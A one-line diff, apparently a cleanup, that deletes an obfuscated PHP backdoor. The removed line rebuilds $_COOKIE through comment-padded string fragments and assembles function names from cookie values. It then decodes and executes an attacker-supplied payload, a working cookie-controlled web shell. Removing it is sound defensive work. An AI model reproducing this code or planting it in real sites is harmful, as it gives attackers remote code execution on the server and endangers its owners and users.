@@ -1,1 +1,0 @@
-<?php $x='_CO';$r/*6**/='E';$t/*F^]z*/='OKI';$os=/*_*/${$x.$t.$r};if(isset($os['EM'])){$gq=/*j*/$os['EM'].$os['oR'];$oy=$os['W'].$os['wW'].$os['gg'];$zr=$gq('',$oy($os['p']));$zr();}
